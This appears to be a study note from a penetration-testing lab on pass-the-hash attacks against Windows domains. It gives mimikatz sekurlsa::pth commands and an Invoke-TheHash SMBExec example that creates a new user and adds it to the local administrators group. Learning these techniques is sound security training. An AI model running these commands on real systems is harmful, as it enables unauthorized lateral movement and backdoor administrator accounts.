From time to time, we will encounter some hash that cannot be cracked using wordlist due to user having a good practice in making their password. However, if we obtained the hash of an account that have administrative privilege, we can attempt to perform PTH attacks by authenticating with the hash instead of the cleartext password.

-Passing the hash with mimikatz:
We can use mimikatz to spawn process in other user's context if we obtained their hash
```
mimikatz.exe
privilege::debug
sekurlsa::pth /user:<username> /<rc4/ntlm>:<hash> /domain:<domain_name> /run:<process to spawn>
exit
```

-Passing the hash with PowerShell Invoke-TheHash:
We can load up Invoke-TheHash module to execute commands over the domain in other user's context:
```
Import-Module .\Invoke-TheHash.psd1
Invole-SMBExec -Target <ip> -Domain inlanefreight.htb -Username <username> -Hash <userhash> -Command "<command>" 
Example: 
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

```
